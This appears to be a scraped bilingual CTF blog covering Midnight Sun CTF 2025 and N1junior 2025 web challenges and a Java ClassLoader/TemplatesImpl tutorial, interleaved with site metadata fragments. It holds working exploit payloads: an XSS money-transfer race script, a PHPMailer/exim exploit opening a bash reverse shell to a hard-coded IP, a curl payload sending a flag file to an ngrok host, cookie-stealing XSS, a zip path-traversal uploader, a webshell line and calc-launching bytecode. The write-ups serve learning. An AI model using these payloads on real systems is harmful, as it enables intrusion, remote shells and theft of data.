vulnerability that would allow one into the Billionaire Club by obtaining one billion loyalty points in their Hackchan account.\rCondition of getting flag #\r在views.py中看见了得到flag的条件\nSaw the condition for getting the flag in views.py:\ncase \u0026#39;delete-account-and-get-flag\u0026#39;: if current_user.balance \u0026gt;= 999_999_999 and not current_user.is_manager and not current_user.is_admin: current_user.remove() db.session.commit() flash(\u0026#39;midnight{********REDACTED********}\u0026#39;, \u0026#39;success\u0026#39;) return redirect(\u0026#39;/\u0026#39;) case _: if current_user.balance \u0026gt;= 999_999_999 and not current_user.is_manager and not current_user.is_admin: context[\u0026#39;show_flag_button\u0026#39;] = True template = \u0026#34;authenticated_template.html\u0026#34; 即当当前用户的balance大于999_999_999的时候就可以得到flag，所以要看一下逻辑。\nThat is, when the current user\u0026rsquo;s balance is greater than 999_999_999, the flag can be obtained. So we need to examine the logic.\nbot处理流程 #\r在bot.js中处理problem中的url的过程，这个地方就可以构造路由让admin去访问。\nIn bot.js, the URL in problem is handled — this is where we can construct a route to make the admin visit it.\nfor (const word of problemWords) { const urlPattern = /^http:\\/\\/web:8000\\//; if (urlPattern.test(word) \u0026amp;\u0026amp; word !== homeOrigin) { const currentProblem = page.url() await page.goto(word); await page.waitForTimeout(2000); await page.goto(currentProblem); } } 然后和balance有关的函数只有\nThen, the only function related to balance is:\ndef send_transaction(): with app.app_context(): confirmed_transactions = Transaction.query.filter(Transaction.status == \u0026#39;confirmed\u0026#39;).all() for transaction in confirmed_transactions: sender = User.query.get(transaction.sender_id) recipient = User.query.get(transaction.recipient_id) if sender and recipient: if sender.balance \u0026gt;= transaction.amount: transaction.status = \u0026#39;sent\u0026#39; if not sender.is_manager: sender.balance -= transaction.amount recipient.balance += transaction.amount else: transaction.status = \u0026#39;rejected\u0026#39; db.session.commit() 然后我们现在要找到一个地方去得到balance，于是翻看源码 这里用了TF-IDF，将question转换为了数值向量\nNow we need to find a place to gain balance, so let\u0026rsquo;s go through the source code. Here, TF-IDF is used to convert the question into a numeric vector.\ntfidf_vectorizer = TfidfVectorizer() faq_questions = [item[\u0026#39;question\u0026#39;] for item in faq_data] tfidf_matrix = tfidf_vectorizer.fit_transform(faq_questions) 然后我们主要看到处理fac这里。\nNow focus on how faq is handled.\ncase \u0026#39;faq\u0026#39;: question = request.args.get(\u0026#39;question\u0026#39;) if question: user_question_tfidf = tfidf_vectorizer.transform([question]) cosine_similarities = linear_kernel(user_question_tfidf, tfidf_matrix).flatten() most_similar_index = cosine_similarities.argsort()[-1] label = faq_data[most_similar_index][\u0026#39;label\u0026#39;] listdir = sorted(os.listdir(\u0026#39;templates/faq/answers\u0026#39;)) for file in listdir: if label in file: template = \u0026#39;/faq/answers/\u0026#39; + file context[\u0026#39;question\u0026#39;] = question break else: flash(\u0026#39;Answer not found, please contact us\u0026#39;, \u0026#39;danger\u0026#39;) template = \u0026#39;faq/faq.html\u0026#39; else: template = \u0026#39;faq/faq.html\u0026#39; 所以我们只需要找一个label匹配到我们的.swp文件（题目故意留的，可以嵌入xss，but我利用vim -r 看不出来是什么问题，所以等wp吧，再补上）\nSo we only need to find a label that matches our .swp file (intentionally left by the challenge, can be used to inject XSS — but I couldn’t see the problem clearly using vim -r, so I’ll wait for the writeup to patch this part). 因为是.开头的文件，所以在文件系统里面会放在最前面，再回顾我们的fac内容，这里只贴出部分\nSince it’s a file starting with ., it will be listed at the top of the filesystem. Looking back at our faq content (partial screenshot): 我们只需要匹配其中的media即可，他就会将.swap文件渲染出来。 所以我们只需要让action=fac\u0026amp;question={text}的text内容与对应的question对应上即可\nWe just need to match media in it, and it will render the .swp file. So we only need to let action=faq\u0026amp;question={text} — where the text matches a question — and it will work: playload: https://hackchan-mjk2mpay.ctf.pro/?action=faq\u0026amp;question=How can I get in touch with your PR department for collaboration?\u0026lt;script\u0026gt;alert('hacked by dt')\u0026lt;/script\u0026gt; 即可触发xss，那么接下来就很简单了，记得我们前面的bot吗，只需要控制这个xss让bot给我们转钱即可。 所以让bot访问：\nThat will trigger XSS. Next is straightforward. Remember the bot from earlier? We just need to control the XSS to make the bot transfer money to us. So let the bot visit: http://web:8000/?action=create-transaction9然后post过去 recipient=deletee\u0026amp;amount=9999999999 但是一次最多只能转10块钱，所以还得看一下逻辑，然后注意到处理的时候是分两块的\nBut only 10 units can be transferred at a time. Let\u0026rsquo;s review the logic. Note that processing is split into two phases:\n看到这里confirmed_transactions = Transaction.query.filter(Transaction.status == 'confirmed').all()所以我们可以在confirm_transaction之后的间隙将订单的status更改一次为confirmed即可完成转账，也就是race condition 最后的playload：\nSee here: confirmed_transactions = Transaction.query.filter(Transaction.status == 'confirmed').all() — so we can change the status of a transaction to confirmed in the gap after confirming, to complete the transfer. That’s a race condition. Final payload:\nfetch(\u0026#39;http://web:8000/?action=create-transaction\u0026#39;, { \u0026#39;headers\u0026#39;: { \u0026#34;content-type\u0026#34;: \u0026#39;application/x-www-form-urlencoded\u0026#39; }, \u0026#39;method\u0026#39;: \u0026#39;POST\u0026#39;, \u0026#39;body\u0026#39;: \u0026#39;recipient=ADD_USER_HERE\u0026amp;amount=1\u0026#39;, \u0026#39;credentials\u0026#39;: \u0026#39;include\u0026#39; }).then(html =\u0026gt; { return html.text(); }).then(html =\u0026gt; { const parser = new DOMParser(); const doc = parser.parseFromString(html, \u0026#39;text/html\u0026#39;); return [...doc.querySelectorAll(\u0026#39;table \u0026gt; tbody \u0026gt; tr \u0026gt; td:first-child\u0026#39;)]; }) .then(canidates =\u0026gt; { return canidates.map(function(item) { return item.innerText; }); }) .then(canidates =\u0026gt; { return canidates.map(function(item) { return parseInt(item, 10); }); }) .then(canidates =\u0026gt; { return 1 + Math.max(...canidates); }).then(tid =\u0026gt; { return tid.toString(); }).then(tid =\u0026gt; { fetch(\u0026#39;http://web:8000/?action=create-transaction\u0026#39;, { \u0026#39;headers\u0026#39;: { \u0026#39;content-type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, }, \u0026#39;method\u0026#39;: \u0026#39;POST\u0026#39;, \u0026#39;body\u0026#39;: \u0026#39;recipient=ADD_USER_HERE\u0026amp;amount=1\u0026#39;, \u0026#39;credentials\u0026#39;: \u0026#39;include\u0026#39; }).then(function(resp) { setTimeout(() =\u0026gt; { fetch(\u0026#39;http://web:8000/?action=create-transaction\u0026#39;, { \u0026#39;headers\u0026#39;: { \u0026#39;content-type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, }, \u0026#39;method\u0026#39;: \u0026#39;POST\u0026#39;, \u0026#39;body\u0026#39;: \u0026#39;recipient=ADD_USER_HERE\u0026amp;amount=999999989\u0026amp;transaction_id=\u0026#39; + tid, \u0026#39;credentials\u0026#39;: \u0026#39;include\u0026#39; }); }, 20); }); }); 用的\u0026lt;img src=x onerror=\u0026quot;eval(atob('playload'))\u0026quot;/\u0026gt;注意下编码问题即可，最后再次感谢HighDex 用英文说一遍:\nUse \u0026lt;img src=x onerror=\u0026quot;eval(atob('playload'))\u0026quot;/\u0026gt;, just watch out for encoding issues. Finally, again, many thanks to HighDex. In English:\nI’m very grateful to HighDex who get firstplace at this competition, Congratulations! Uselesscorp #\r扫了一下目录\nScanned the directories: 看到class.phpmailer.php的日期找到对应版本为v5.2.17\nFound class.phpmailer.php and determined its version is v5.2.17: https://github.com/PHPMailer/PHPMailer/blob/v5.2.17/class.phpmailer.php\n打CVE 2016-10033\nTried CVE-2016-10033 using this exploit:\nexp: https://github.com/opsxcq/exploit-CVE-2016-10033\n但是发现打不通，说明环境可能和原本的不大一样。 原来是在这里:\nBut it didn’t work — possibly due to environment differences. Turns out the reason is here: debian系统一般会用到exim4的MTA，所以我们就去看doc:\nDebian systems often use Exim4 as MTA, so we checked the docs: https://www.exim.org/exim-html-current/doc/html/spec_html/ch-string_expansions.html\n发现了如下几个好玩的东西:\n${readfile{}{}}可以读取文件然后将其中的换行符替换掉 ${readsocket{\u0026hellip;}{\u0026hellip;}{\u0026hellip;}{\u0026hellip;}{\u0026hellip;}}向本地或远程 socket 发送请求字符串，读取响应数据，并将其插入到当前字符串中。适用于与其他服务通信，如 Redis、Python 微服务、SMTP、HTTP 接口等。 ${run,preexpand{option}}运行一个外部命令，将其标准输出作为变量 $value，并依据返回码决定使用哪个返回值。 Found some interesting things:\n${readfile{}{}} reads file content and replaces newline characters\n${readsocket{\u0026hellip;}{\u0026hellip;}{\u0026hellip;}{\u0026hellip;}{\u0026hellip;}} sends request to socket (local/remote), reads response, useful for communicating with services like Redis, Python microservices, etc.\n${run,preexpand{option}} executes an external command and uses its stdout as $value\n所以我们可以构造一下sendmail的请求: 注意一下这里的email的格式，遵循RFC 3696,我们用\u0026quot;来闭合前面的引号然后用-Ov来让后面的语句无效,这个是HighDex师傅告诉我的，基本上都适用，我们也可以用一个极短的例如@d\nSo we can craft a sendmail request: Note the email format — according to RFC 3696, we use \u0026quot; to escape and close the previous quote, then use -Ov to nullify the following content. This trick was shared by HighDex, and it\u0026rsquo;s widely applicable. We can also use a short one like @d.\nname=delete\u0026amp;email=\u0026#34;a\\\u0026#34; -be playload -Ov=\u0026#34;@q.com\u0026amp;subject=1\u0026amp;message=Pwned\u0026amp;submit=submit 于是最后的exp：\nFinal exploit:\nimport requests import base64 URL = \u0026#34;http://192.168.174.128\u0026#34; Rev_Ip = \u0026#34;101.132.122.178\u0026#34; Rev_Port = \u0026#34;9999\u0026#34; sess = requests.Session() def send_mail(mail: str): data = { \u0026#34;name\u0026#34; : \u0026#34;delete\u0026#34;, \u0026#34;email\u0026#34; : mail, \u0026#34;subject\u0026#34; : \u0026#34;1\u0026#34;, \u0026#34;message\u0026#34; : \u0026#34;Pwned!\u0026#34;, \u0026#34;submit\u0026#34; : \u0026#34;submit\u0026#34; } sess.post(URL + \u0026#39;/index.php\u0026#39;, data=data) print(f\u0026#34;send mail:{mail}\u0026#34;) def run_exp(cmd: str): base64_cmd = base64.b64encode(cmd.encode()).decode() exploit = \u0026#34;${run,preexpand{${base64d:\u0026#34;+base64_cmd+\u0026#34;}}}\u0026#34; print(f\u0026#34;Your playload is {exploit}, now I send it to the server!\\n\u0026#34;) send_mail(\u0026#39;\u0026#34;a\\\\\u0026#34; -be \u0026#39; + exploit + \u0026#39; \u0026#34;@d\u0026#39;) get_shell = f\u0026#34;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/{Rev_Ip}/{Rev_Port} 0\u0026gt;\u0026amp;1\u0026#34; run_exp(f\u0026#34;/bin/sh -c \\\u0026#34;echo -n \u0026#39;{get_shell}\u0026#39; \u0026gt;\u0026gt; /tmp/delete\\\u0026#34;\u0026#34;) run_exp(\u0026#34;/bin/bash /tmp/delete\u0026#34;) run_exp(\u0026#34;/bin/rm /tmp/delete\u0026#34;) 其他playload（官方给的）:\nOther payloads (from the official writeup):\ncurl -X POST https://useless-94tszh4z.ctf.pro -d \u0026#39;name=a\u0026#39; -d \u0026#39;subject=a\u0026#39; -d \u0026#39;message=a\u0026#39; -d \u0026#39;submit=submit\u0026#39; -d \u0026#39;email=\u0026#34;\\\u0026#34; -be ${readsocket{inet:0.tcp.ap.ngrok.io:19066}{${readfile{/flag.txt}}}} \u0026#34;@x\u0026#39; 不过思路也是差不多的，只是一个直接read了我是弹shell\nBut the idea is basically the same — just that the official one directly reads the flag, while I went for a reverse shell.\n写在最后 #\r写双语的原因是起初写完后发到midnight的discord上了，但是有师傅批判说哪有人用母语写文章的(XD)，于是考虑到国内和国外的的用户，我就写成了这样子。\n","date":"22 May 2025","externalUrl":null,"permalink":"/posts/midnight-sun-ctf-2025-web/","section":"Posts","summary":"","title":"Midnight Sun CTF 2025 WEB","type":"posts"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/tags/race-conditon/","section":"Tags","summary":"","title":"Race Conditon","type":"tags"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/tags/sendmail/","section":"Tags","summary":"","title":"Sendmail","type":"tags"},{"content":"原理 #\r继承关系 双亲委派机制 自定义loader #\rpackage com.example; import java.io.*; import java.nio.file.Files; import java.nio.file.Path; import java.nio.file.Paths; public class FileClassLoader extends ClassLoader{ protected String basePath; public FileClassLoader(String basePath){ super(); this.basePath = basePath; } @Override protected Class\u0026lt;?\u0026gt; findClass(String name){ byte[] arr; try { Path path = Paths.get(this.basePath, name + \u0026#34;.class\u0026#34;); arr = Files.readAllBytes(path); return defineClass(name, arr, 0, arr.length); } catch (IOException e) { e.printStackTrace(); } return null; } public static void main(String[] args) throws Exception{ ClassLoader classLoader = new FileClassLoader(\u0026#34;D:\\\\\u0026#34;); Class clazz = classLoader.loadClass(\u0026#34;Hello\u0026#34;); clazz.newInstance(); } } URLloader #\rpackage com.example; import java.net.URL; import java.net.URLClassLoader; public class Demo { public static void main(String[] args) throws Exception{ URL url = new URL(\u0026#34;http://127.0.0.1:8000/\u0026#34;); URLClassLoader loader = new URLClassLoader(new URL[]{url}); Class clazz = loader.loadClass(\u0026#34;Hello\u0026#34;); clazz.newInstance(); } } ClassLoader#defineClass #\r获取ClassLoader方式\nClassLoader loader = Thread.currentThread().getContextClassLoader();\rClassLoader loader = ClassLoader.getSystemClassLoader();\rClassLoader loader = this.getClass().getClassLoader(); playload\npackage com.example; import java.lang.reflect.*; import java.util.Base64; public class Demo { public static void main(String[] args) throws Exception{ String exp = \u0026#34;yv66vgAAADQAIQoACAASCgATABQIABUKABMAFgcAFwoABQAYBwAZBwAaAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHABkHABcBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwACQAKBwAbDAAcAB0BAAhjYWxjLmV4ZQwAHgAfAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAIAAKAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAQABAAkACgABAAsAAABgAAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQACAAwAAAAaAAYAAAACAAQABAANAAcAEAAFABEABgAVAAgADQAAABAAAv8AEAABBwAOAAEHAA8EAAEAEAAAAAIAEQ==\u0026#34;; byte[] code = Base64.getDecoder().decode(exp); ClassLoader loader = ClassLoader.getSystemClassLoader(); // AppClassLoader Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, String.class, byte[].class, int.class, int.class); defineClassMethod.setAccessible(true); Class clazz = (Class) defineClassMethod.invoke(loader, \u0026#34;Hello\u0026#34;, code, 0, code.length); clazz.newInstance(); } } TemplatesImpl #\r因为 defineClass 的作用域往往都是不开放的, 攻击者一般很难利用到它, 所以接下来我们引入 TemplatesImpl 这条非常重要的利用链, 它是各大反序列化链 (cc, rome, fastjson) 利用的基础\nTemplatesImpl 的全类名是 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl, 其内部实现了一个 TransletClassLoader\n具体的调用链\nTemplatesImpl#getOutputProperties()\rTemplatesImpl#newTransformer()\rTemplatesImpl#getTransletInstance()\rTemplatesImpl#defineTransletClasses()\rTransletClassLoader#defineClass() 然后我们自己来看看吧，这里就从getOutputProperties开始分析\ngetOutputProperties #\rpublic synchronized Properties getOutputProperties() { try { return newTransformer().getOutputProperties(); } catch (TransformerConfigurationException e) { return null; } } 这里调用了newTransformer,然后我们这里传入的是TemplatesImpl的对象，所以我们就进入到TemplatesImpl中\nnewTransformer #\rpublic synchronized Transformer newTransformer() throws TransformerConfigurationException { TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) { transformer.setURIResolver(_uriResolver); } if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) { transformer.setSecureProcessing(true); } return transformer; } 可以看到这里new 了一个TemplatesImpl，然后调用了一个getTransletInstance方法然后我们跟进\ngetTransletInstance #\rprivate Translet getTransletInstance() throws TransformerConfigurationException { try { if (_name == null) return null; if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].getConstructor().newInstance(); translet.postInitialization(); translet.setTemplates(this); translet.setOverrideDefaultParser(_overrideDefaultParser); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) { translet.setAuxiliaryClasses(_auxClasses); } return translet; } catch (InstantiationException | IllegalAccessException | NoSuchMethodException | InvocationTargetException e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString(), e); } } 然后做两个判断后，走到defineTransletClasses\ndefineTransletClasses #\rprivate void defineTransletClasses() throws TransformerConfigurationException { if (_bytecodes == null) { ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); } TransletClassLoader loader = AccessController.doPrivileged(new PrivilegedAction\u0026lt;TransletClassLoader\u0026gt;() { public TransletClassLoader run() { return new TransletClassLoader(ObjectFactory.findClassLoader(), _tfactory.getExternalExtensionsMap()); } }); try { final int classCount = _bytecodes.length; _class = new Class\u0026lt;?\u0026gt;[classCount]; if (classCount \u0026gt; 1) { _auxClasses = new HashMap\u0026lt;\u0026gt;(); } // create a module for the translet String mn = \u0026#34;jdk.translet\u0026#34;; String pn = _tfactory.getPackageName(); assert pn != null \u0026amp;\u0026amp; pn.length() \u0026gt; 0; ModuleDescriptor descriptor = ModuleDescriptor.newModule(mn, Set.of(ModuleDescriptor.Modifier.SYNTHETIC)) .requires(\u0026#34;java.xml\u0026#34;) .exports(pn, Set.of(\u0026#34;java.xml\u0026#34;)) .build(); Module m = createModule(descriptor, loader); // the module needs access to runtime classes Module thisModule = TemplatesImpl.class.getModule(); // the module also needs permission to access each package // that is exported to it PermissionCollection perms = new RuntimePermission(\u0026#34;*\u0026#34;).newPermissionCollection(); Arrays.asList(Constants.PKGS_USED_BY_TRANSLET_CLASSES).forEach(p -\u0026gt; { thisModule.addExports(p, m); perms.add(new RuntimePermission(\u0026#34;accessClassInPackage.\u0026#34; + p)); }); CodeSource codeSource = new CodeSource(null, (CodeSigner[])null); ProtectionDomain pd = new ProtectionDomain(codeSource, perms, loader, null); // java.xml needs to instantiate the translet class thisModule.addReads(m); for (int i = 0; i \u0026lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i], pd); final Class\u0026lt;?\u0026gt; superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex \u0026lt; 0) { ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } catch (ClassFormatError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString(), e); } catch (LinkageError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString(), e); } } 这个地方着重看一下 defineTransletClasses 先判断 _bytecodes 是否为 null, 然后实例化了 TransletClassLoader\n之后获取 _bytecodes.length 作为 classCount (_bytecodes 是一个二维数组, 它的长度表示一共有几组字节码需要被加载)\n接着遍历 _bytecodes 并且调用 loader.defineClass() 将返回值赋给 _class 数组\n最后会判断该 Class 是否继承自 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet, 如果条件为真, 就将 _transletIndex 赋为 Class 对应的索引\n走到这里就加载完了然后又回到getTransletInstance\ngetTransletInstance #\r主要看这\n_class[_transletIndex].getConstructor().newInstance(); translet.postInitialization(); translet.setTemplates(this); 此时class就是其对象，然后就实例化他，造成命令执行\n最后exp\npackage com.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.*; import java.util.*; import java.util.Properties; public class Hello { public static void main(String[] args) throws Exception{ String exp = \u0026#34;yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAB4HABwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHRpb25zBwAgAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAApIZWxsby5qYXZhDAAJAAoHACEMACIAIwEACGNhbGMuZXhlDAAkACUBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAmAAoBABFjb20vZXhhbXBsZS9IZWxsbwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAADAAEACQAKAAEACwAAAGAAAgACAAAAFiq3AAG4AAISA7YABFenAAhMK7YABrEAAQAEAA0AEAAFAAIADAAAABoABgAAAAoABAAMAA0ADwAQAA0AEQAOABUAEAANAAAAEAAC/wAQAAEHAA4AAQcADwQAAQAQABEAAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABUAEgAAAAQAAQATAAEAEAAUAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAaABIAAAAEAAEAEwABABUAAAACABY=\u0026#34;; byte[] code = Base64.getDecoder().decode(exp); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(\u0026#34;_name\u0026#34;,\u0026#34;evil\u0026#34;,templates); setFieldValue(\u0026#34;_bytecodes\u0026#34;,new byte[][]{code},templates); setFieldValue(\u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl(), templates); templates.getOutputProperties(); } public static void setFieldValue(String name, Object value, Object obj) throws Exception{ Field f = obj.getClass().getDeclaredField(name); f.setAccessible(true); f.set(obj, value); } } ","date":"16 May 2025","externalUrl":null,"permalink":"/posts/classloader-learning/","section":"Posts","summary":"","title":"Classloader Learning","type":"posts"},{"content":"","date":"16 May 2025","externalUrl":null,"permalink":"/categories/java/","section":"Categories","summary":"","title":"JAVA","type":"categories"},{"content":"","date":"16 May 2025","externalUrl":null,"permalink":"/tags/loader/","section":"Tags","summary":"","title":"Loader","type":"tags"},{"content":"","date":"15 May 2025","externalUrl":null,"permalink":"/tags/include/","section":"Tags","summary":"","title":"Include","type":"tags"},{"content":"前言 #\r最近比较忙，n1junior当时报名了没去打，现在来复现一下，感谢bao师傅提供的附件\nGavatar #\rupload.php:\n\u0026lt;?php require_once \u0026#39;common.php\u0026#39;; $user = getCurrentUser(); if (!$user) header(\u0026#39;Location: index.php\u0026#39;); $avatarDir = __DIR__ . \u0026#39;/avatars\u0026#39;; if (!is_dir($avatarDir)) mkdir($avatarDir, 0755); $avatarPath = \u0026#34;$avatarDir/{$user[\u0026#39;id\u0026#39;]}\u0026#34;; if (!empty($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;])) { $finfo = new finfo(FILEINFO_MIME_TYPE); if (!in_array($finfo-\u0026gt;file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;]), [\u0026#39;image/jpeg\u0026#39;, \u0026#39;image/png\u0026#39;, \u0026#39;image/gif\u0026#39;])) { die(\u0026#39;Invalid file type\u0026#39;); } move_uploaded_file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;], $avatarPath); } elseif (!empty($_POST[\u0026#39;url\u0026#39;])) { $image = @file_get_contents($_POST[\u0026#39;url\u0026#39;]); if ($image === false) die(\u0026#39;Invalid URL\u0026#39;); file_put_contents($avatarPath, $image); } header(\u0026#39;Location: profile.php\u0026#39;); 最后可以只传url，直接post传 然后avatar.php 可以正常读到 但是dockerfile可以看见flag要rce才可以读到 无脑上cn-ext，用的珂字辈师傅的脚本： https://github.com/kezibei/php-filter-iconv/blob/main/README.md cmd = \u0026ldquo;echo \u0026lsquo;\u0026lt;?=@eval($_POST[1]);?\u0026gt;\u0026rsquo; \u0026gt; shell.php\u0026rdquo; traefik #\r主要考了一个traefik的动态代理转发还有本地xff伪造。 我们通过查看doc可以看到traefik的动态配置是可以实时更新的。 所以思路就是，上传一个config文件将dynamic配置给他覆盖掉将flag路由暴露出来。 首先看一下原本的配置怎么写的\n# Dynamic configuration http: services: proxy: loadBalancer: servers: - url: \u0026#34;http://127.0.0.1:8080\u0026#34; routers: index: rule: Path(`/public/index`) entrypoints: [web] service: proxy upload: rule: Path(`/public/upload`) entrypoints: [web] service: proxy 所以我们需要加一个路由\nflag: rule: Path(\u0026#39;/flag\u0026#39;) entrypoints: [web] service: proxy 注意一下要写一个middlewares加一个hearder就行了 然后看到源码:\n上传后就解压 没有校验，所以可以目录穿越，所以现在的思路就很清晰，上传一个文件目录穿越到config文件，覆盖然后将flag路由暴露出来最后伪造即可\nfrom zipfile import ZipFile import zipfile import requests binary=open(\u0026#34;dynamic.yml\u0026#34;,\u0026#34;r\u0026#34;).read() with zipfile.ZipFile(\u0026#34;test.zip\u0026#34;, \u0026#34;w\u0026#34;, zipfile.ZIP_DEFLATED) as zipf: zipf.writestr(\u0026#34;./../../.config/dynamic.yml\u0026#34;, binary) print(f\u0026#34;[+] ZIP 文件生成完成\u0026#34;) def upload(): files = {\u0026#34;file\u0026#34;: (\u0026#34;test.zip\u0026#34;, open(\u0026#34;test.zip\u0026#34;, \u0026#34;rb\u0026#34;), \u0026#34;application/zip\u0026#34;)} res = requests.post(url = \u0026#34;http://192.168.174.128/public/upload\u0026#34; ,files = files) if res.status_code == 200: print(\u0026#34;文件上传成功！\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: upload() res = requests.get(url = \u0026#34;http://192.168.174.128/flag\u0026#34;) print(res.text) display #\r很明显的一道xss题，大家说挺好玩的我就来玩玩了 这里用了DOMpurify来对标签进行过滤， hints: 用iframe嵌入子页面可以重新唤起DOM解析器解析script标签\n先看一下index路由\nif (queryText) { const sanitizedText = sanitizeContent(atob(decodeURI(queryText))); if (sanitizedText.length \u0026gt; 0) { textInput.innerHTML = sanitizedText; // 写入预览区 contentDisplay.innerHTML = textInput.innerText; // 写入效果显示区 insertButton.disabled = false; } else { textInput.innerText = \u0026#34;Only allow h1, h2 tags and plain text\u0026#34;; } } 用的是textInput文本作为输入，然后base64编码一下，测试： csp策略:\nconst csp = \u0026#34;script-src \u0026#39;self\u0026#39;; object-src \u0026#39;none\u0026#39;; base-uri \u0026#39;none\u0026#39;;\u0026#34;; index.js中设置了dompurify，限制了只能用h1和h2标签 处理异常路由，也就是404页面\napp.use((req, res) =\u0026gt; { res.status(200).type(\u0026#39;text/plain\u0026#39;).send(`${decodeURI(req.path)} : invalid path`); }); // 404 页面 所以其实就是打404页面然后让其解析为html即可。 文章： https://www.justus.pw/writeups/sekai-ctf/tagless.html 然后标签就用实体化编码绕过就行，因为是text 最后就是iframe+srcdoc\n最后playload： \u0026amp;#60;iframe srcdoc=\u0026quot;\u0026amp;#60;script src='**/fetch(http://ip/+document.cookie);//'\u0026amp;#62;\u0026amp;#60;/script\u0026amp;#62;\u0026quot;\u0026amp;#62; 当然这里的实体化编码也可以用别的方式来写，然后闭合前面的/也可以利用换行来绕。 但是不知道为什么我这里打bot打不通，但是index可以打的通，可能是环境问题 bushi，刚写完这一段就能打通 EasyDB #\r来到我最不擅长的java了，但是总得面对吧，一步步来吧\nDOCKER_BUILDKIT=1 docker-compose up -d 先起一个环境，去吃个饭，晚点来继续搞\n很简单判断是H2数据库\nlogin路由 跟进看到有个query的地方 executeQuery这里可以堆叠输入 黑名单： 然后不会了，马上去补知识\u0026hellip;\u0026hellip;.. 可以看到h2的配置文件 然后网上看了大概有几种打法，还在学习中呜呜呜，但是这里是利用alies可以写一个方法来调用去弹shell或者其他操作，太晚了，该休息了\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;.\n","date":"15 May 2025","externalUrl":null,"permalink":"/posts/n1junior2025/","section":"Posts","summary":"","title":"N1junior2025","type":"posts"},{"content":"","date":"15 May 